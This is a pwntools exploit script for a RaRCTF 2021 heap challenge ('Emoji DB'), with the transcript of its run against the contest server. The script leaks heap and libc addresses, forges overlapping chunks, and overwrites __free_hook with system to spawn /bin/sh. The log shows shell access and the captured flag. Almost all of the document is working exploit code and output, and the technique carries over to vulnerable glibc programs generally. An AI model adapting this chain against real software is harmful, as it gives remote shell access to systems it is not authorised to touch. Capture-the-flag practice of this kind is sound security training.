from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './emoji'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "193.57.159.27"
  PORT = 28933
  s = remote(HOST, PORT)
  libc = ELF("./libc-2.31.so")
else:
  s = process(BINARY)
  libc = elf.libc

def Add(title, emoji):
  s.sendlineafter("> ", "1")
  s.sendlineafter("title: ", title)
  s.sendlineafter("emoji: ", emoji)
  
def Read(idx):
  s.sendlineafter("> ", "2")
  s.sendlineafter("read: ", str(idx))
  
def Delete(idx):
  s.sendlineafter("> ", "3")
  s.sendlineafter("delete: ", str(idx))
  
def GC():
  s.sendlineafter("> ", "4")

# heap leak
Add("A"*0x8, "\xf8"+"\xb4"*4)
Read(0)
s.recvuntil("Title: ")
r = s.recvuntil("\n")[:-1]
heap_leak = u64(r + b"\x00\x00")
heap_base = heap_leak - 0x12b4
print("heap_leak =", hex(heap_leak))
print("heap_base =", hex(heap_base))

for i in range(7):
  Add("B"*0x8, "") 

for i in range(7):
  Delete(i+1)
Add("C"*0x8, "")
Add("D"*0x8, "")
Delete(1)
GC()

# libc leak
Add("E"*0x8, b"\xfc"+b"e"*3+p64(heap_base+0x1850)[:2])
Read(1)
s.recvuntil("Title: ")
r = s.recvuntil("\n")[:-1]
libc_leak   = u64(r + b"\x00\x00")
libc_base   = libc_leak - 0x1ebbe0
free_hook   = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

# Overlap chunk
Add(b"F"*0x18+p64(0x91), "")
Add("G"*8, b"\xfc"+b"g"*3+p64(heap_base+0x1710)[:2])
Add("H"*0x8, "")

Delete(4)
Delete(5)
Delete(3)
GC()

Add(b"I"*0x18+p64(0x91)+p64(free_hook), "")

Add("/bin/sh\x00", "") 
Add("J"*8, "") 
Add(p64(system_addr), "")

# start /bin/sh
Delete(4)
GC()

s.interactive()

'''
mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_Return_of_Emoji_DB_600/Emoji$ python3 solve.py r
[*] '/home/mito/CTF/RaRCTF_2021/Pwn_Return_of_Emoji_DB_600/Emoji/emoji'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 193.57.159.27 on port 28933: Done
[*] '/home/mito/CTF/RaRCTF_2021/Pwn_Return_of_Emoji_DB_600/Emoji/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
heap_leak = 0x5644234ec2b4
heap_base = 0x5644234eb000
libc_leak = 0x7efe7f849be0
libc_base = 0x7efe7f65e000
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls -l
total 28
lrwxrwxrwx.    1 root root     7 Jul 23 17:35 bin -> usr/bin
drwxr-xr-x.    2 root root     6 Apr 15  2020 boot
drwxr-xr-x.    5 root root   340 Aug 10 01:16 dev
-rwxr-xr-x.    1 root root 20912 Aug  6 10:27 emoji
drwxr-xr-x.    1 root root    66 Aug  8 15:06 etc
-rw-r--r--.    1 root root    38 Aug  3 01:39 flag.txt
drwxr-xr-x.    1 root root    17 Aug  8 14:53 home
lrwxrwxrwx.    1 root root     7 Jul 23 17:35 lib -> usr/lib
lrwxrwxrwx.    1 root root     9 Jul 23 17:35 lib32 -> usr/lib32
lrwxrwxrwx.    1 root root     9 Jul 23 17:35 lib64 -> usr/lib64
lrwxrwxrwx.    1 root root    10 Jul 23 17:35 libx32 -> usr/libx32
drwxr-xr-x.    2 root root     6 Jul 23 17:35 media
drwxr-xr-x.    2 root root     6 Jul 23 17:35 mnt
drwxr-xr-x.    2 root root     6 Jul 23 17:35 opt
dr-xr-xr-x. 1366 root root     0 Aug 10 01:16 proc
drwx------.    2 root root    37 Jul 23 17:38 root
drwxr-xr-x.    5 root root    58 Jul 23 17:38 run
lrwxrwxrwx.    1 root root     8 Jul 23 17:35 sbin -> usr/sbin
drwxr-xr-x.    2 root root     6 Jul 23 17:35 srv
dr-xr-xr-x.   13 root root     0 Aug 10 01:14 sys
drwxrwxrwt.    2 root root     6 Jul 23 17:38 tmp
drwxr-xr-x.    1 root root    41 Jul 23 17:35 usr
drwxr-xr-x.    1 root root    17 Jul 23 17:38 var
$ cat flag.txt
rarctf{tru5t_th3_f1r5t_byt3_1bc8d429}
'''

